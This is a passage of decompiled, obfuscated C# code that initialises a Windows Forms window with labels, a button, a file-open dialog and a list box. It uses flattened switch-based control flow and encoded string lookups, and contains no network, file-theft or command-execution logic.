					Delegate141.smethod_0(this, new SizeF(Class43.smethod_2(1), Class43.smethod_2(2)));
					num = -16;
					continue;
				case -23:
					Label_3 = Delegate119.smethod_0();
					Label_4 = Delegate119.smethod_0();
					Label_5 = Delegate119.smethod_0();
					Label_6 = Delegate119.smethod_0();
					Label_7 = Delegate119.smethod_0();
					ListBox_0 = Delegate120.smethod_0();
					num = -14;
					continue;
				case -24:
					Delegate145.smethod_0(Delegate144.smethod_0(this), (Control)(object)Label_0);
					Delegate145.smethod_0(Delegate144.smethod_0(this), (Control)(object)Button_0);
					Delegate146.smethod_0(this, (FormBorderStyle)Class43.smethod_0(1));
					Delegate148.smethod_0(this, (Icon)Delegate147.smethod_0(object_, Class41.smethod_0(26844)));
					Delegate149.smethod_0(this, (byte)Class43.smethod_0(0) != 0);
					Delegate150.smethod_0(this, Class41.smethod_0(26855));
					num = -2;
					continue;
				case -25:
					Delegate125.smethod_0(Label_2, Class41.smethod_0(26813));
					Delegate126.smethod_0(Label_2, new Size(Class43.smethod_0(39), Class43.smethod_0(43)));
					Delegate127.smethod_0(Label_2, Class43.smethod_0(2));
					Delegate75.smethod_0(Label_2, Class41.smethod_0(26820));
					Delegate136.smethod_0(Label_2, (ContentAlignment)Class43.smethod_0(34));
					num = -61;
					continue;
				case -26:
					Delegate137.smethod_0(Label_3, (byte)Class43.smethod_0(1) != 0);
					while (true)
					{
						int num10 = Resources.smethod_0(42);
						while (true)
						{
							switch (num10 ^ Class43.smethod_0(96))
							{
							case -22:
								Delegate123.smethod_0(Label_3, Delegate122.smethod_0(Class41.smethod_0(27557), Class43.smethod_2(0), (FontStyle)Class43.smethod_0(1), (GraphicsUnit)Class43.smethod_0(2), (byte)Class43.smethod_0(0)));
								num10 = -7;
								continue;
							case -23:
								num10 = -63;
								continue;
							case -24:
								Delegate126.smethod_0(Label_3, new Size(Class43.smethod_0(0), Class43.smethod_0(46)));
								num10 = -60;
								continue;
							case -25:
								Delegate134.smethod_0(Label_3, Delegate138.smethod_0());
								num10 = -62;
								continue;
							case -26:
								num10 = -61;
								continue;
							case -27:
								Delegate125.smethod_0(Label_3, Class41.smethod_0(26791));
								num10 = -59;
								continue;
							case -28:
								num10 = -52;
								continue;
							case -29:
								num10 = -50;
								continue;
							case -30:
								num = -15;
								num10 = -51;
								continue;
							case -31:
								Delegate124.smethod_0(Label_3, new Point(Class43.smethod_0(44), Class43.smethod_0(48)));
								num10 = -64;
								continue;
							case -32:
								num10 = Class16.smethod_0(27);
								continue;
							case -33:
								num10 = -57;
								continue;
							case -21:
								goto end_IL_0373;
							}
							break;
						}
						continue;
						end_IL_0373:
						break;
					}
					continue;
				case -27:
					Delegate137.smethod_0(Label_7, (byte)Class43.smethod_0(1) != 0);
					while (true)
					{
						int num9 = Class5.smethod_0(9);
						while (true)
						{
							switch (num9 ^ Class43.smethod_0(100))
							{
							case -27:
								num9 = Class16.smethod_0(37);
								continue;
							case -28:
								num9 = -59;
								continue;
							case -29:
								Delegate134.smethod_0(Label_7, Delegate138.smethod_0());
								num9 = -61;
								continue;
							case -30:
								Delegate123.smethod_0(Label_7, Delegate122.smethod_0(Class41.smethod_0(27557), Class43.smethod_2(0), (FontStyle)Class43.smethod_0(1), (GraphicsUnit)Class43.smethod_0(2), (byte)Class43.smethod_0(0)));
								num9 = -58;
								continue;
							case -31:
								num9 = -57;
								continue;
							case -32:
								Delegate124.smethod_0(Label_7, new Point(Class43.smethod_0(44), Class43.smethod_0(52)));
								num9 = -3;
								continue;
							case -33:
								num = Class35.smethod_0(8);
								num9 = -63;
								continue;
							case -34:
								Delegate125.smethod_0(Label_7, Class41.smethod_0(26768));
								num9 = -4;
								continue;
							case -35:
								num9 = -60;
								continue;
							case -36:
								Delegate126.smethod_0(Label_7, new Size(Class43.smethod_0(0), Class43.smethod_0(46)));
								num9 = -8;
								continue;
							case -37:
								num9 = -5;
								continue;
							case -38:
								num9 = -7;
								continue;
							case -26:
								goto end_IL_04bc;
							}
							break;
						}
						continue;
						end_IL_04bc:
						break;
					}
					continue;
				case -28:
					Delegate145.smethod_0(Delegate144.smethod_0(this), (Control)(object)Label_5);
					Delegate145.smethod_0(Delegate144.smethod_0(this), (Control)(object)Label_4);
					Delegate145.smethod_0(Delegate144.smethod_0(this), (Control)(object)Label_3);
					Delegate145.smethod_0(Delegate144.smethod_0(this), (Control)(object)Label_2);
					Delegate145.smethod_0(Delegate144.smethod_0(this), (Control)(object)Label_1);
					num = -51;
					continue;
				case -29:
					Delegate127.smethod_0(Label_1, Class43.smethod_0(7));
					while (true)
					{
						int num8 = Class43.smethod_0(43);
						while (true)
						{
							switch (num8 ^ Class43.smethod_0(85))
							{
							case 58:
								Delegate123.smethod_0(Label_2, Delegate122.smethod_0(Class41.smethod_0(27557), Class43.smethod_2(0), (FontStyle)Class43.smethod_0(1), (GraphicsUnit)Class43.smethod_0(2), (byte)Class43.smethod_0(0)));
								num8 = 16;
								continue;
							case 57:
								Delegate134.smethod_0(Label_2, Delegate133.smethod_0());
								num8 = 18;
								continue;
							case 56:
								num8 = 27;
								continue;
							case 55:
								Delegate124.smethod_0(Label_2, new Point(Class43.smethod_0(41), Class43.smethod_0(47)));
								num8 = 13;
								continue;
							case 54:
								Delegate135.smethod_0(Label_2, (BorderStyle)Class43.smethod_0(1));
								num8 = 17;
								continue;
							case 53:
								num8 = 19;
								continue;
							case 52:
								num8 = 22;
								continue;
							case 51:
								num8 = 24;
								continue;
							case 50:
								num8 = 21;
								continue;
							case 49:
								Delegate136.smethod_0(Label_1, (ContentAlignment)Class43.smethod_0(34));
								num8 = 26;
								continue;
							case 48:
								num8 = 20;
								continue;
							case 47:
								num = -62;
								num8 = 25;
								continue;
							case 59:
								goto end_IL_0652;
							}
							break;
						}
						continue;
						end_IL_0652:
						break;
					}
					continue;
				case -30:
					Delegate125.smethod_0(Label_6, Class41.smethod_0(26737));
					Delegate126.smethod_0(Label_6, new Size(Class43.smethod_0(39), Class43.smethod_0(43)));
					Delegate127.smethod_0(Label_6, Class43.smethod_0(19));
					Delegate75.smethod_0(Label_6, Class41.smethod_0(26744));
					Delegate136.smethod_0(Label_6, (ContentAlignment)Class43.smethod_0(34));
					num = -64;
					continue;
				case -31:
					while (true)
					{
						int num7 = Resources.smethod_0(42);
						while (true)
						{
							switch (num7 ^ Class43.smethod_0(94))
							{
							case -24:
								Delegate125.smethod_0(Label_5, Class41.smethod_0(26714));
								num7 = Resources.smethod_0(41);
								continue;
							case -25:
								num7 = -56;
								continue;
							case -26:
								num7 = -59;
								continue;
							case -27:
								Delegate126.smethod_0(Label_5, new Size(Class43.smethod_0(0), Class43.smethod_0(46)));
								num7 = -55;
								continue;
							case -28:
								num7 = -13;
								continue;
							case -29:
								Delegate123.smethod_0(Label_5, Delegate122.smethod_0(Class41.smethod_0(27557), Class43.smethod_2(0), (FontStyle)Class43.smethod_0(1), (GraphicsUnit)Class43.smethod_0(2), (byte)Class43.smethod_0(0)));
								num7 = -14;
								continue;
							case -30:
								Delegate134.smethod_0(Label_5, Delegate138.smethod_0());
								num7 = -51;
								continue;
							case -31:
								num7 = -52;
								continue;
							case -32:
								num7 = -50;
								continue;
							case -33:
								num7 = -16;
								continue;
							case -34:
								num = -59;
								num7 = -60;
								continue;
							case -35:
								Delegate124.smethod_0(Label_5, new Point(Class43.smethod_0(44), Class43.smethod_0(50)));
								num7 = -53;
								continue;
							case -23:
								goto end_IL_080a;
							}
							break;
						}
						continue;
						end_IL_080a:
						break;
					}
					continue;
				case -32:
					Delegate127.smethod_0(Label_5, Class43.smethod_0(30));
					while (true)
					{
						int num6 = Class16.smethod_0(26);
						while (true)
						{
							switch (num6 ^ Class43.smethod_0(96))
							{
							case -29:
								num6 = -58;
								continue;
							case -30:
								Delegate123.smethod_0(Label_6, Delegate122.smethod_0(Class41.smethod_0(27557), Class43.smethod_2(0), (FontStyle)Class43.smethod_0(1), (GraphicsUnit)Class43.smethod_0(2), (byte)Class43.smethod_0(0)));
								num6 = -1;
								continue;
							case -31:
								num6 = -7;
								continue;
							case -32:
								Delegate136.smethod_0(Label_5, (ContentAlignment)Class43.smethod_0(34));
								num6 = -57;
								continue;
							case -33:
								Delegate134.smethod_0(Label_6, Delegate133.smethod_0());
								num6 = -5;
								continue;
							case -34:
								Delegate124.smethod_0(Label_6, new Point(Class43.smethod_0(41), Class43.smethod_0(51)));
								num6 = -4;
								continue;
							case -35:
								num6 = Class5.smethod_0(9);
								continue;
							case -36:
								Delegate135.smethod_0(Label_6, (BorderStyle)Class43.smethod_0(1));
								num6 = -3;
								continue;
							case -37:
								num6 = -60;
								continue;
							case -38:
								num = -57;
								num6 = -62;
								continue;
							case -39:
								num6 = -8;
								continue;
							case -40:
								num6 = -2;
								continue;
							case -28:
								goto end_IL_094f;
							}
							break;
						}
						continue;
						end_IL_094f:
						break;
					}
					continue;
				case -33:
					Delegate125.smethod_0(ListBox_0, Class41.smethod_0(26701));
					while (true)
					{
						int num5 = Class43.smethod_0(41);
						while (true)
						{
							switch (num5 ^ Class43.smethod_0(105))
							{
							case 48:
								num5 = 11;
								continue;
							case 47:
								num5 = 0;
								continue;
							case 46:
								Delegate123.smethod_0(Label_8, Delegate122.smethod_0(Class41.smethod_0(27557), Class43.smethod_2(0), (FontStyle)Class43.smethod_0(1), (GraphicsUnit)Class43.smethod_0(2), (byte)Class43.smethod_0(0)));
								num5 = 14;
								continue;
							case 45:
								num = -49;
								num5 = 20;
								continue;
							case 44:
								num5 = 9;
								continue;
							case 43:
								num5 = Class43.smethod_0(2);
								continue;
							case 42:
								num5 = 13;
								continue;
							case 41:
								num5 = 2;
								continue;
							case 40:
								Delegate127.smethod_0(ListBox_0, Class43.smethod_0(57));
								num5 = 10;
								continue;
							case 39:
								Delegate126.smethod_0(ListBox_0, new Size(Class43.smethod_0(55), Class43.smethod_0(56)));
								num5 = 15;
								continue;
							case 38:
								Delegate124.smethod_0(Label_8, new Point(Class43.smethod_0(41), Class43.smethod_0(58)));
								num5 = 8;
								continue;
							case 37:
								Delegate137.smethod_0(Label_8, (byte)Class43.smethod_0(1) != 0);
								num5 = 21;
								continue;
							case 49:
								goto end_IL_0a99;
							}
							break;
						}
						continue;
						end_IL_0a99:
						break;
					}
					continue;
				case -34:
					Delegate125.smethod_0(Label_4, Class41.smethod_0(26670));
					Delegate126.smethod_0(Label_4, new Size(Class43.smethod_0(39), Class43.smethod_0(43)));
					Delegate127.smethod_0(Label_4, Class43.smethod_0(3));
					Delegate75.smethod_0(Label_4, Class41.smethod_0(26677));
					Delegate136.smethod_0(Label_4, (ContentAlignment)Class43.smethod_0(34));
					Delegate137.smethod_0(Label_5, (byte)Class43.smethod_0(1) != 0);
					num = -60;
					continue;
				case -35:
					num = -8;
					continue;
				case -36:
					Delegate126.smethod_0(Button_0, new Size(Class43.smethod_0(39), Class43.smethod_0(40)));
					Delegate127.smethod_0(Button_0, Class43.smethod_0(0));
					Delegate128.smethod_0(Button_0, Class41.smethod_0(27608));
					Delegate129.smethod_0(Button_0, (byte)Class43.smethod_0(1) != 0);
					Delegate130.smethod_0(OpenFileDialog_0, Class41.smethod_0(26647));
					Delegate131.smethod_0(OpenFileDialog_0, Class41.smethod_0(26666));
					num = -4;
					continue;
				case -37:
					Delegate151.smethod_0(this, Class43.smethod_3(3));
					Delegate152.smethod_0(this, (byte)Class43.smethod_0(0) != 0);
					Delegate153.smethod_0(this, (FormStartPosition)Class43.smethod_0(1));
					Delegate154.smethod_0(this, Class41.smethod_0(27635));
					Delegate155.smethod_0(this, (byte)Class43.smethod_0(0) != 0);
					num = -55;
					continue;
				case -38:
					while (true)
					{
						int num4 = Class5.smethod_0(9);
						while (true)
						{
							switch (num4 ^ Class43.smethod_0(98))
							{
							case -36:
								num4 = -8;
								continue;
							case -37:
								Delegate139.smethod_0(ListBox_0, Delegate122.smethod_0(Class41.smethod_0(27557), Class43.smethod_2(0), (FontStyle)Class43.smethod_0(1), (GraphicsUnit)Class43.smethod_0(2), (byte)Class43.smethod_0(0)));
								num4 = -1;
								continue;
							case -38:
								num4 = -15;
								continue;
							case -39:
								num = -6;
								num4 = -10;
								continue;
							case -40:
								Delegate140.smethod_0(ListBox_0, (byte)Class43.smethod_0(1) != 0);
								num4 = -3;
								continue;
							case -41:
								num4 = -14;
								continue;
							case -42:
								num4 = -2;
								continue;
							case -43:
								Delegate124.smethod_0(ListBox_0, new Point(Class43.smethod_0(41), Class43.smethod_0(54)));
								num4 = -4;
								continue;
							case -44:
								num4 = -13;
								continue;
							case -45:
								Delegate136.smethod_0(Label_7, (ContentAlignment)Class43.smethod_0(34));
								num4 = -7;
								continue;
							case -46:
								num4 = -16;
								continue;
							case -47:
								Delegate127.smethod_0(Label_7, Class43.smethod_0(53));
								num4 = Class16.smethod_0(28);
								continue;
							case -35:
								goto end_IL_0d26;
							}
							break;
						}
						continue;
						end_IL_0d26:
						break;
					}
					continue;
				case -39:
					while (true)
					{
						int num3 = Class43.smethod_0(53);
						while (true)
						{
							switch (num3 ^ Class43.smethod_0(100))
							{
							case 48:
								num3 = 2;
								continue;
							case 47:
								Delegate132.smethod_0(OpenFileDialog_0, Class41.smethod_0(27608));
								num3 = 12;
								continue;
							case 46:
								Delegate135.smethod_0(Label_0, (BorderStyle)Class43.smethod_0(1));
								num3 = 10;
								continue;
							case 45:
								num3 = 15;
								continue;
							case 44:
								num3 = 14;
								continue;
							case 43:
								num3 = 0;
								continue;
							case 42:
								num3 = 13;
								continue;
							case 41:
								Delegate124.smethod_0(Label_0, new Point(Class43.smethod_0(41), Class43.smethod_0(42)));
								num3 = Class43.smethod_0(43);
								continue;
							case 40:
								Delegate123.smethod_0(Label_0, Delegate122.smethod_0(Class41.smethod_0(27557), Class43.smethod_2(0), (FontStyle)Class43.smethod_0(1), (GraphicsUnit)Class43.smethod_0(2), (byte)Class43.smethod_0(0)));
								num3 = 11;
								continue;
							case 39:
								Delegate134.smethod_0(Label_0, Delegate133.smethod_0());
								num3 = 1;
								continue;
							case 38:
								num3 = 9;
								continue;
							case 37:
								num = -50;
								num3 = 22;
								continue;
							case 49:
								goto end_IL_0e61;
							}
							break;
						}
						continue;
						end_IL_0e61:
						break;
					}
					continue;
				case -40:
					while (true)
					{
						int num2 = Class43.smethod_0(19);
						while (true)
						{
							switch (num2 ^ Class43.smethod_0(98))
							{
							case 50:
								num2 = Class43.smethod_0(2);
								continue;
							case 49:
								Delegate123.smethod_0(Label_1, Delegate122.smethod_0(Class41.smethod_0(27557), Class43.smethod_2(0), (FontStyle)Class43.smethod_0(1), (GraphicsUnit)Class43.smethod_0(2), (byte)Class43.smethod_0(0)));
								num2 = 1;
								continue;
							case 48:
								num2 = 26;
								continue;
							case 47:
								num2 = 4;
								continue;
							case 46:
								num2 = 0;
								continue;
							case 45:
								Delegate125.smethod_0(Label_1, Class41.smethod_0(27587));
								num2 = 5;
								continue;
							case 44:
								Delegate134.smethod_0(Label_1, Delegate138.smethod_0());
								num2 = 27;
								continue;
							case 43:
								Delegate126.smethod_0(Label_1, new Size(Class43.smethod_0(0), Class43.smethod_0(46)));
								num2 = 25;
								continue;
							case 42:
								num2 = 2;
								continue;
							case 41:
								Delegate124.smethod_0(Label_1, new Point(Class43.smethod_0(44), Class43.smethod_0(45)));
								num2 = 12;
								continue;
							case 40:
								num = -58;
								num2 = 24;
								continue;
							case 39:
								num2 = 6;
								continue;
							case 51:
								goto end_IL_0f9e;
							}
							break;
						}
						continue;
						end_IL_0f9e:
						break;
					}
					continue;
				case -41:
					Label_8 = Delegate119.smethod_0();
					Delegate121.smethod_0(this);
					Delegate123.smethod_0(Button_0, Delegate122.smethod_0(Class41.smethod_0(27557), Class43.smethod_2(0), (FontStyle)Class43.smethod_0(1), (GraphicsUnit)Class43.smethod_0(2), (byte)Class43.smethod_0(0)));
					Delegate124.smethod_0(Button_0, new Point(Class43.smethod_0(37), Class43.smethod_0(38)));
					Delegate125.smethod_0(Button_0, Class41.smethod_0(27578));
					num = -7;
					continue;
				case -42:
					object_ = Delegate116.smethod_0(Delegate12.smethod_0(typeof(GForm0).TypeHandle));
					Button_0 = Delegate117.smethod_0();
					OpenFileDialog_0 = Delegate118.smethod_0();
					Label_0 = Delegate119.smethod_0();
					Label_1 = Delegate119.smethod_0();
					Label_2 = Delegate119.smethod_0();
					num = -52;
					continue;
				case -43:
					Delegate142.smethod_0(this, (AutoScaleMode)Class43.smethod_0(1));
					Delegate143.smethod_0(this, new Size(Class43.smethod_0(60), Class43.smethod_0(61)));
					Delegate145.smethod_0(Delegate144.smethod_0(this), (Control)(object)Label_8);
					Delegate145.smethod_0(Delegate144.smethod_0(this), (Control)(object)ListBox_0);
					Delegate145.smethod_0(Delegate144.smethod_0(this), (Control)(object)Label_7);
					Delegate145.smethod_0(Delegate144.smethod_0(this), (Control)(object)Label_6);
					num = -63;
					continue;
				case -44:
					Delegate127.smethod_0(Label_3, Class43.smethod_0(8));
					Delegate134.smethod_0(Label_4, Delegate133.smethod_0());
					Delegate135.smethod_0(Label_4, (BorderStyle)Class43.smethod_0(1));
					Delegate123.smethod_0(Label_4, Delegate122.smethod_0(Class41.smethod_0(27557), Class43.smethod_2(0), (FontStyle)Class43.smethod_0(1), (GraphicsUnit)Class43.smethod_0(2), (byte)Class43.smethod_0(0)));
					Delegate124.smethod_0(Label_4, new Point(Class43.smethod_0(41), Class43.smethod_0(49)));
					num = -5;
					continue;
				case -20:
					Delegate156.smethod_0(this);
					return;
				}
				break;
			}
		}
	}
}
